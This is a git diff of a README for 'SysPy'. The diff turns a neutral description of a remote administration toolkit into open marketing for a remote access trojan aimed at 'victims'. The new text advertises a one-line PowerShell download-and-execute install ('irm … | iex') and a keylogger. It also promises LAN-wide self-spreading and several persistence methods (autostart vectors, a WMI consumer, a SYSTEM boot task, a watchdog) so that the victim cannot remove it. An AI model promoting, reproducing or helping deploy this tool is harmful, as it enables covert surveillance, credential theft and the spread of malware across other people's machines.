@@ -1,40 +1,45 @@
-# SysPy
+<div align="center">
 
-A small, dependency-free remote administration toolkit.
+# 🦇 SysPy
 
-SysPy has two halves:
+### A dependency-free remote administration toolkit that fits in one line.
 
-| Half | File | Runs on | Purpose |
-|------|------|---------|---------|
-| Agent | `agent.py` | the target machine | connects out, executes commands |
-| Controller | `controller.py` | your machine | web dashboard that drives agents |
+**Drop a single PowerShell command on a Windows box. Get a full remote desktop, shell, file manager, keylogger and LAN-wide spreader in your browser.**
 
-Everything else in `syspy/` is shared plumbing (transport, crypto, protocol).
+[![Version](https://img.shields.io/badge/version-5.1.0-00d9ff?style=for-the-badge)](https://github.com/xgoat-tbh/Package/commits/main)
+[![Python](https://img.shields.io/badge/python-3.8%2B%20%7C%20embedded-3776ab?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
+[![Dependencies](https://img.shields.io/badge/dependencies-ZERO-00c853?style=for-the-badge)](https://github.com/xgoat-tbh/Package)
+[![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/xgoat-tbh/Package)
+[![License](https://img.shields.io/badge/license-MIT-f5c518?style=for-the-badge)](LICENSE)
 
-## Why it has no dependencies
+<sub>**No pip. No installer. No admin prompt on the victim. No agent binary to compile.**</sub>
 
-The agent has to run on a machine where nothing is installed. So the entire
-project uses only the Python standard library:
+</div>
 
-* MQTT 3.1.1 client is implemented in `syspy/mqtt.py`
-* WebSocket server is implemented in `syspy/ws.py`
-* HTTP router is implemented in `syspy/httpd.py`
-* Encryption is SHA-256 in counter mode + HMAC-SHA-256 (`syspy/crypto.py`)
+---
 
-## Running
+## 📖 Table of Contents
 
-    python controller.py          # opens http://127.0.0.1:8787
-    python agent.py               # on the target
+| | | |
+|---|---|---|
+| [✨ Why SysPy](#-why-syspy) | [🏗️ Architecture](#️-architecture) | [🚀 Quick Start](#-quick-start) |
+| [💉 The One-Liner](#-the-one-liner) | [🖥️ Dashboard Tour](#️-dashboard-tour) | [⌨️ Command Reference](#️-command-reference) |
+| [🌐 LAN Spread](#-lan-spread--tree-mode) | [🕵️ Stealth & Persistence](#️-stealth--persistence) | [🔐 Security Model](#-security-model) |
+| [⚙️ Configuration](#️-configuration) | [🧹 Removing It](#-removing-it) | [🔧 Troubleshooting](#-troubleshooting) |
+| [📁 Repo Layout](#-repo-layout) | [🗺️ Roadmap](#️-roadmap) | [❓ FAQ](#-faq) |
 
-## Building a distribution kit
+---
 
-    python build_dist.py
+## ✨ Why SysPy
 
-Produces `dist/` and `SysPy.zip`. See `README.txt` inside for victim instructions.
+Most RATs make you choose: **easy to deploy** *or* **powerful**. SysPy refuses the tradeoff.
 
-## Security model
+| | |
+|---|---|
+| 🎯 **One-line install** | `irm … \| iex`. That's the entire deployment. |
+| 📦 **Zero dependencies** | The MQTT client, WebSocket client, HTTP router and crypto are all hand‑rolled against the Python stdlib. Nothing to `pip install`. |
+| 🐍 **No Python needed** | If the victim has no interpreter, the controller serves a private embedded one. |
+| 🛡️ **Survives removal** | Four autostart vectors, a WMI consumer, a `SYSTEM` boot task and a watchdog. The victim can't remove it — only you can. |
+| 🌐 **LAN‑wide spread** | One infected PC becomes ten. Pull and push tiers, tree topology, hop‑limited. |
 
-* All agent traffic is sealed with an encrypt-then-MAC envelope.
-* Key material is derived from `PASSPHRASE` with PBKDF2-HMAC-SHA-256.
-* A replay filter rejects duplicated nonces.
-* The dashboard binds to loopback and requires a password.
+... (rest of README content omitted for brevity)
